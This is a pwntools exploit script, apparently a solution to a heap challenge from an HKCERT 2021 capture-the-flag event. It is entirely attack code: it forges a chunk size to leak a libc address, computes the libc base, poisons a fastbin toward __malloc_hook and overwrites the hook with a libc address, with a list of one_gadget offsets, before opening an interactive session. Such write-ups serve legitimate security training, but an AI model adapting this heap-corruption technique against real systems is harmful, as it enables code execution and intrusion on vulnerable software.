from pwn import *

elf = ELF("./heap")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("chalp.hkcert21.pwnable.hk", 28359)

def sa(s, d):
    target.sendafter(s, str(d))

def sla(s, d):
    sa(s, str(d)+"\n")

def add(size, msg):
    sla("$", 1)
    print ".",
    sla(":", size)
    if msg == "":
        return
    sa(">>", msg)

def view(idx):
    sla("$", 2)
    sla("?", idx)

def edit(idx, msg):
    sla("$", 3)
    sla("?", idx)
    if msg == "":
        return
    sa(">>", msg)

def remove(idx):
    sla("$", 4)
    sla("?", idx)

add(1, "0")
for i in range(7):
    add(0x78, str(i+1)*0x20)

edit(0, "")
edit(0, "A"*0x18 + p64(0x421))

remove(1)
edit(0, "A"*0x20)
view(0)
target.recvuntil("A"*0x20)
libc_leak = u64(target.recvline().strip().ljust(8, '\x00'))
libc_base = libc_leak - 0x00007f5e233debe0 + 0x00007f5e231f3000
log.info("LIBC Base: " + hex(libc_base))

edit(0, "A"*0x18 + p64(0x31) + p64(libc_leak)*2 + p64(0)*2 + p64(0x30) + p64(0x80))

for i in range(7):
    add(0x68, "A")
    remove(1)
add(1, "B")
edit(1, "")
add(0x68, "A")
remove(8)
#remove(3)
edit(1, "B"*0x18 + p64(0x31) + p64(0)*5 + p64(0x71) + p64(libc_base + libc.sym['__malloc_hook'] - 0x33))

gadgets = [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6e73, 0xe6e76]
gadget = libc.sym['__stack_chk_fail']
#gadget = gadgets[3]

add(0x68, "JUNK")
add(0x68, "a"*0x23 + p64(libc_base + gadget))

edit(1, "B"*0x18 + p64(0x1337))
#sla("$", 1)
remove(9)

#gdb.attach(target, 'heap bins')

target.interactive()